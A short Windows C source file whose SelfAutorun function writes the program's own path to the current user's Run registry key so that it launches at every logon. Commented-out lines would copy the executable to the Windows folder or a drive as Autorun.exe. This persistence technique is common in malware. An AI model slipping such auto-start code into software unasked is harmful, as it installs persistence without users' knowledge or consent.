#include"header.h"

BOOL SelfAutorun() {
	HKEY hKey = NULL;
	LONG lResult = 0;
	TCHAR szExeName[MAX_PATH + 1];
	TCHAR szWinPath[MAX_PATH + 1];
	GetModuleFileName(GetModuleHandle(0), szExeName, STRLENN(szExeName));
	//GetWindowsDirectory(szWinPath, STRLENN(szWinPath));
	//lstrcat(szWinPath, TEXT("\\Autorun.exe"));
	//if (0 == CopyFile(szExeName, TEXT("E:\\Autorun.exe"), FALSE)) {
		//return FALSE;
	//
	lResult = RegOpenKey(
		HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		&hKey);
	if (ERROR_SUCCESS != lResult) {
		return FALSE;
	}
	RegSetValueEx(hKey, L"Autorun", 0, REG_SZ, (PBYTE)(szExeName),
		lstrlen(szExeName) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);
	return TRUE;
}


